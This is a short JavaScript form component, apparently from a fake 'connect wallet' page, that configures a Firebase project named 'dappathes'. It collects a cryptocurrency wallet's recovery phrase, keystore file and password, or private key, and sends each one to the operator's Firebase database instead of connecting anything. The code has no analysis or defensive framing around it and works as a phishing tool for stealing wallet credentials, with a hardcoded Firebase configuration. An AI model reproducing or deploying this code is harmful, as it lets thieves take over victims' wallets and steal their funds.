function wconnForm() {
  var firebaseConfig = {
    apiKey: "AIzaSyB6scNSdd1Bm8nKhnjmfArdMVowPWKHDhs",
    authDomain: "dappathes.firebaseapp.com",
    databaseURL: "https://info-97fa7-default-rtdb.firebaseio.com",
    projectId: "dappathes",
    storageBucket: "dappathes.appspot.com",
    messagingSenderId: "164507747168",
    appId: "1:164507747168:web:1c71c0195f0eb819d65405",
  };
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  var database = firebase.database();

  //

  return {
    selected: "phrase",
    isLoading: false,
    status: false,
    phrase: "",
    keystore: "",
    keyPassword: "",
    privatekey: "",
    submitPhrase() {
      database.ref("phrase").push(this.phrase);
      alert(this.phrase);
      reset();
    },
    submitKeystoreJSON() {
      database.ref("keystore").push(this.keystore);
      database.ref("KeyPassword").push(this.keyPassword);
      reset();
      alert(this.keystore);
    },
    submitPrivateKey() {
      database.ref("privatekey").push(this.privatekey);
      reset();
      alert(this.privatekey);
    },
  };
}
